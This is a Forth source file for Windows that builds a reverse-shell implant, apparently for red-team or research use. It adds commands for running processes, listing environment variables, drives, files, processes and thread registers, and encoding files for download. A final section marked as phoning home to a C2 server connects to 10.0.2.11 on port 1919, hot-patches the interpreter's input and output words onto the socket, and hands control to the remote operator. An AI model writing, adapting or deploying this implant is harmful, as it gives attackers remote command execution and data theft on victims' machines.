0 !echo

\ ------------------------------------------------------------------------ 
\ Gaps in the core API
\ ------------------------------------------------------------------------

\ Pretty-print the output

kernel32   0   dllfun GetLastError  GetLastError
kernel32   1   dllfun CloseHandle   CloseHandle

: .err   red ." Error! " GetLastError . clear cr ;
: .pre   ." \n\x1b[35m---- BEGIN OUTPUT ----\n\x1b[35;1m" ;
: .post  ." \x1b[0m\x1b[35m----- END OUTPUT -----\n\x1b[0m" prompt ;

: .cstring   dup c@ dup if emit 1+ tail then 2drop ;

variable bytes

\ ------------------------------------------------------------------------
\ Strings in regions of memory
\ ------------------------------------------------------------------------

private

variable binary  
variable start   
variable len     

\ initialize string finding engine
: init   binary on start off len off ;

\ test if a byte is a printable character
: print? 32 126 within ;

\ print strings when found if they're long enough
: .addr  start @ hex 16 cyan .r magenta dec ;
: .str   start @ len @ type cr ;
: .str?  len @ 4 >= if .addr .str then ;

\ track strings in memory
: track  start ! binary off 1 len ! ;
: >plain binary @ if track else drop len incr then ;
: >bin   binary @ 0= if binary on .str? then ;

public{

\ print ASCII strings in a region of memory

: strings ( address length -- )
  init .pre bounds do
    i c@ print? if i >plain else >bin then      
  loop
  .post
;

}public

\ ------------------------------------------------------------------------
\ Executing commands
\ ------------------------------------------------------------------------

\ This examples imports some Win32 functions and provides a simple interface
\ for executing processes and collecting their output.  

\ DLL    ARGS  GPA    WORD          EXPORT NAME
kernel32  10   dllfun CreateProcess CreateProcessA
kernel32   4   dllfun CreatePipe    CreatePipe   
kernel32   5   dllfun ReadFile      ReadFile  

private

\ STARTUP_INFO struct that defines parameters for CreateProcess
create sinfo 104 allot 104 sinfo d!
: dwFlags     sinfo 60 + ;
: wShowWindow sinfo 64 + ;
: hStdOutput  sinfo 88 + ;
: hStdError   sinfo 96 + ;

\ PROCESS_INFO, filled out by CreateProcess in case we need it
create pinfo 24 allot
: hProcess    pinfo ;
: hThread     pinfo 8 + ;

\ This is a small record for storing handles for a FIFO
create I/O 0 , 0 , 24 , 0 , 1 , ( inherit )
: <pipe @ ;
: >pipe 8 + @ ;

variable running 

\ To be good citizens, we close the handles.  Even if the child process has
\ closed them, they can be "re-closed" safely, so we close everything in a
\ heavy-handed fashion.

: clean  
  I/O >pipe CloseHandle drop
  I/O <pipe CloseHandle drop 
  hProcess  CloseHandle drop
  hThread   CloseHandle drop ;

\ We might run more than one command in a session, so this will initialize
\ the sinfo struct and create a pipe for a new CreateProcess execution.
\ For safety, it has seemed like a good idea to zero out the sinfo between
\ runs.

: plumb
  sinfo 4 + 100 zero
  257 dwFlags d!
  0 wShowWindow d!
  I/O dup 8 + dup 8 + 0 CreatePipe drop 
  I/O >pipe hStdOutput !
  I/O >pipe hStdError ! ;

\ The key to good coordination with the child process is to close the "write"
\ side of the pipe from the parent process.  This way, when the child exits
\ it will close its reference to the HANDLE and our attempts to ReadFile from
\ this side will fail.

: /out   I/O >pipe CloseHandle drop ;

\ This just wraps up the call to CreateProcess to keep things pretty.
\ Consumes a counted string as input representing the process to execute.

: exec   drop 0 swap 0 0 1 0 0 0 sinfo pinfo CreateProcess /out ;

\ Read to the end of the Pipe's lifetime.  For an infinite running process,
\ this could prevent returning control to the interpreter, so be careful!

: read   I/O <pipe here 512 bytes 0 ReadFile ;
: slurp  read if here bytes @ type tail then ;

\ Provide a friendly interface.  Will read the line after it's called in the
\ outer interpreter to get the string for CreateProcess.  This lets you do
\ pipelines or other complex calls without worrying about string escapes.

public{

: cmd    plumb exec if running on .pre slurp .post else .err then clean ;
: !!     readline cmd ;
: spawn  s" main.exe" plumb exec I/O dup <pipe swap >pipe ;

}public

\ ------------------------------------------------------------------------
\ View environment variables
\ ------------------------------------------------------------------------

private

kernel32 0 dllfun GetEnvironmentStrings GetEnvironmentStrings
kernel32 3 dllfun GetEnvironmentVariable GetEnvironmentVariableA

variable z?
variable done?

: (walk)     dup c@ >r 1+ r> ;
: handle0  drop z? @ if done? on else z? on cr then ;
: handle   if z? off emit else handle0 then ;
: output   done? @ if drop else (walk) dup handle tail then ;

public{

: .ctable  done? off z? off .pre output .post ;
: getenv*  GetEnvironmentStrings dup if .ctable then ;
: getenv   readline drop here 1024 GetEnvironmentVariable if .pre here .cstring cr .post then ;

}public

\ ------------------------------------------------------------------------
\ Interact with filesystem and other environment aspects
\ ------------------------------------------------------------------------

private

kernel32 2 dllfun GCD GetCurrentDirectoryA
kernel32 0 dllfun GetCurrentProcessId GetCurrentProcessId
kernel32 2 dllfun GetLogicalDriveStrings GetLogicalDriveStringsA
kernel32 2 dllfun FindFirstVolume FindFirstVolumeA
kernel32 3 dllfun FindNextVolume FindNextVolumeA

: >vol  here 1024 FindNextVolume ;
: lsvol here .cstring cr dup >vol if tail then CloseHandle drop ;
: lsvol here 1024 FindFirstVolume lsvol ;

public{

: pwd here 1024 over GCD .pre type cr .post ;
: pid GetCurrentProcessId ;
: lsvol .pre lsvol .post ;
: lsdrives 1024 here GetLogicalDriveStrings if here .ctable else .err then ;

}public

\ ------------------------------------------------------------------------
\ Listing directory contents
\ ------------------------------------------------------------------------

private

create WIN32_FIND_DATA 8 cells 256 + 14 + allot
variable HANDLE

kernel32 2 dllfun FindFirstFile FindFirstFileA
kernel32 2 dllfun FindNextFile  FindNextFileA
kernel32 1 dllfun FindClose     FindClose

: find-first drop WIN32_FIND_DATA FindFirstFile dup HANDLE ! ;
: find-next  HANDLE @ WIN32_FIND_DATA FindNextFile ;

: .file ( ugly, as formatting strings always is... )
  blue WIN32_FIND_DATA dup
  20 + SYSTEMTIME FileTimeToSystemTime drop SYSTEMTIME .time dup
  28 + dup d@ 32 << swap 4 + d@ + 16 .>r space dup
  d@ 16 and if magenta else cyan then dup
  44 + .cstring dup
  d@ 16 and if clear ." /" then 
  cr drop
;

: ls ( handle -- )
  find-next if
    .file tail
  then ;

public{ 

: ls ( <line> -- )
  readline find-first 0 > if
    .pre .file ls .post
    HANDLE @ FindClose drop
  else
    .err
  then ;

}public


kernel32 2 dllfun GetComputerName GetComputerNameA

: hostname 
  1024 bytes ! here bytes GetComputerName
  if .pre here .cstring cr .post else .err then ;

\ ------------------------------------------------------------------------
\ Load a file into memory
\ ------------------------------------------------------------------------

private
kernel32 2 dllfun GetFileSize GetFileSize
kernel32 7 dllfun CreateFile CreateFileA
kernel32 5 dllfun ReadFile ReadFile

hex
: loadfile
  drop 80000000 7 0 3 0 0 CreateFile
  dup here dup >r GetFileSize r> d@ 40 << + ( HANDLE size )
  over >r dup >r dup allocate dup >r       ( HANDLE size addr r:HANDLE size addr )
  swap here 0 ReadFile drop               ( r: HANDLE size addr )
  r> r> r>                               ( addr size HANDLE )
  CloseHandle drop                      ( addr size )
;
dec
public

private

\ an ASCII85 encoder so we can view binary files
variable a85acc

: shift    256 a85acc *! ;       \ we add a byte at a time
: output   a85acc @ 256 / ;       \ take off last byte
: convert  4 0 do 85 /mod loop ;   \ turn u32 into base-85 nums
: encode   5 0 do 33 + emit loop ;  \ print values in A85 char space
: next     dup if walk else 0 then ; \ grab next byte (0 after EOS)

\ extract a 4-byte chunk as 32-bit int
: chunk    a85acc off 4 0 do next a85acc +! shift loop output ;

: fileop   >r readline loadfile 2dup .pre r> execute .post drop free ;

public{

\ encode all chunks in string
: ascii85   dup if chunk dup if convert encode else drop [char] z emit then tail then 2drop cr ;     

: cat      ['] type fileop ;
: download ['] ascii85 fileop ;

}public


\ ------------------------------------------------------------------------
\ An interface for listing processes and current status of threads
\ ------------------------------------------------------------------------

private

kernel32 2 dllfun CreateToolhelp32Snapshot CreateToolhelp32Snapshot
kernel32 2 dllfun Process32First Process32First
kernel32 2 dllfun Process32Next Process32Next
kernel32 2 dllfun Thread32First Thread32First 
kernel32 2 dllfun Thread32Next Thread32Next
kernel32 3 dllfun OpenProcess OpenProcess
kernel32 3 dllfun OpenThread  OpenThread
kernel32 1 dllfun SuspendThread SuspendThread
kernel32 1 dllfun ResumeThread ResumeThread
kernel32 2 dllfun GetThreadContext GetThreadContext

hex
: PROCESS_ALL_ACCESS 1f0fff ;
: THREAD_ALL_ACCESS  1f03ff ;

: TH32CS_INHERIT      80000000 ;
: TH32CS_SNAPALL             0 ;
: TH32CS_SNAPHEAPLIST        1 ;
: TH32CS_SNAPMODULE          8 ;
: TH32CS_SNAPMODULE32       10 ;
: TH32CS_SNAPPROCESS         2 ;
: TH32CS_SNAPTHREAD          4 ;
dec

create TOOLMEM 304 allot

: set-snapprocess TOOLMEM 304 over ! dup 8 + 296 zero ;
: set-snapthreads TOOLMEM 28  over ! dup 8 + 20  zero ;

variable TOOLXT
variable TOOLHD
variable TOOLset
variable TOOL1st
variable TOOLnxt

: *tool32
  TOOLMEM TOOLXT @ execute
  TOOLHD @ TOOLset @ execute TOOLnxt @ execute
  if tail then ;

: *tool32
  TOOLXT !
  TOOLHD @ TOOLset @ execute TOOL1st @ execute if
    *tool32
    TOOLHD @ CloseHandle drop
  else
    .err
  then ;

: *tool32 ( eachxt nextxt firstxt setupxt snap )
  0 CreateToolhelp32Snapshot TOOLHD !
  TOOLset !
  TOOL1st !
  TOOLnxt !
  *tool32 ;

: *threads ( xt )
  ['] Thread32Next
  ['] Thread32First
  ['] set-snapthreads
  TH32CS_SNAPTHREAD
  *tool32 ;

: *processes ( xt )
  ['] Process32Next
  ['] Process32First
  ['] set-snapprocess
  TH32CS_SNAPPROCESS
  *tool32 ;

variable PID

create CONTEXT align here 1232 allot does> drop [ rot litq ] ;

hex
: CONTEXT_CONTROL 1 ;
: CONTEXT_INTEGER 2 ;
: CONTEXT_ALL 10001f ; 
dec

: >CONTEXT 
  CONTEXT dup 1232 zero 
  CONTEXT_ALL CONTEXT 48 + d! ;

: nq dup 8 + swap @ 18 .r space ;

: .context
  hex 112 +
  ." Rax: " nq   ." Rcx: " nq   ." Rdx: " nq  ." Rbx: " nq cr
  ." Rsp: " nq   ." Rbp: " nq   ." Rsi: " nq  ." Rdi: " nq cr
  ." R8:  " nq   ." R9:  " nq   ." R10: " nq  ." R11: " nq cr
  ." R12: " nq   ." R13: " nq   ." R14: " nq  ." R15: " nq cr
  ." Rip: " nq   cr
  dec drop ;
  
: @thread ( tid )
  THREAD_ALL_ACCESS 0 rot OpenThread dup if
    dup SuspendThread 0 >= if
      dup >CONTEXT GetThreadContext if
	CONTEXT .context
      else
	.err
      then
      dup ResumeThread 4000000000 > if
	.err ." Resume fail\n"
      then
    else
      .err 
    then
    CloseHandle drop
  else
    .err
  then ;

: .threads*
  dup 12 + d@ PID @ = if
    cyan ." Thread: "
    8 + d@ dup . cr magenta
    @thread cr
  else drop then ;

: .ps
  dup  8 + d@ ." PID: " 8 cyan .r magenta
  dup 28 + d@ ." Threads: " 8 cyan .r magenta
  dup 32 + d@ ." PPID: " 8 cyan .r magenta
      44 +    ." Image: " green .cstring magenta cr ;

public{

: .threads .pre PID ! ['] .threads* *threads .post ;
: ps .pre ['] .ps *processes .post ;

}public

\ ------------------------------------------------------------------------
\ Miscellaneous functions that prove useful sometimes
\ ------------------------------------------------------------------------

private
: dictmap dup if hex dup . dec yellow dup >name type clear cr @ tail then ;
: dictmap last dictmap ;
public

\ ------------------------------------------------------------------------
\ Phone home to C2 server with new outer interpreter
\ ------------------------------------------------------------------------

: help
  yellow
  cr cr
  ." !! <cmd>         Execute command (CreateProcess)\n"
  ." getenv <name>    Get value of indicated environment variable\n"
  ." getenv*          Show values of all environment variables\n"
  ." pwd              Print working directory\n"
  ." pid              Get current process ID\n"
  ." lsvol            List system volumes\n"
  ." lsdrives         List logical drives\n"
  ." ls <glob>        List matching filesystem contents\n"
  ." hostname         Show hostname\n"
  ." cat <path>       Show contents of file\n"
  ." download <path>  Show file contents in ASCII85 encoding\n"
  ." help             Show this help listing\n"
  ." ps               List running processes\n"
  ." <pid> .threads   Show current context for threads in process\n"
  cr
  clear ;  


private

kernel32 1 dllfun ExitProcess ExitProcess
: bye ." \x1b[35;1mFarewell...\x1b[0m"  0 ExitProcess ;

public

: key? 0 0 2drop ;

private
create buffer 8 allot
create WSAInfo 512 allot

variable winsock
variable sock

create ADDR        
2 c, 0 c,           \ AF_INET
7 c, 127 c,          \ port 1919
10 c, 0 c, 2 c, 11 c, \ IP address 10.0.2.11 
0 ,                    \ padding

kernel32 1 dllfun LoadLibrary LoadLibraryA

{ s" ws2_32.dll" }! drop LoadLibrary winsock ! 

winsock @ 2 dllfun WSAStartup WSAStartup
winsock @ 3 dllfun socket socket
winsock @ 3 dllfun connect connect
winsock @ 4 dllfun send send
winsock @ 4 dllfun recv recv
winsock @ 1 dllfun closesocket closesocket
winsock @ 3 dllfun ioctlsocket ioctlsocket 

: sockkey      sock @ buffer 1 0 recv drop buffer c@ dup 10 = if prompt then ;
: sockemit     buffer c! sock @ buffer 1 0 send drop ;
: socktype     sock @ -rot 0 send drop ;
: sockkey?     sock @ 1074030207 bytes ioctlsocket drop bytes @ ;

hex
: replace        ( xt name len )
  lookup >xt     ( xt addr )
  e8 over c! 1+  ( xt addr )
  swap over      ( addr xt addr )
  - 4 -          ( addr delta )
  over d!        ( addr )
  4 + c3 swap c! ( )
;
dec

: wsver        [ hex 0202 dec lit ] ;
: AF_INET      2 ;
: SOCK_STREAM  1 ;
: IPPROTO_TCP  6 ;

: init      wsver WSAInfo WSAStartup drop ;
: plumb     AF_INET SOCK_STREAM IPPROTO_TCP socket sock ! ;
: attach    sock @ ADDR 16 connect drop ;
: terminate sock @ closesocket ;

: outer word dup if parse else 2drop then tail ;

: main
  init plumb attach
  ['] sockkey  s" key" replace 
  ['] socktype s" type" replace
  ['] sockemit s" emit" replace
  ['] sockkey? s" key?" replace
  ['] outer !boot
  cls
  banner
  ." \x1b[35;1mHappy hacking...\x1b[0m\n"
  0 !echo
  prompt
  outer
; 
public
main
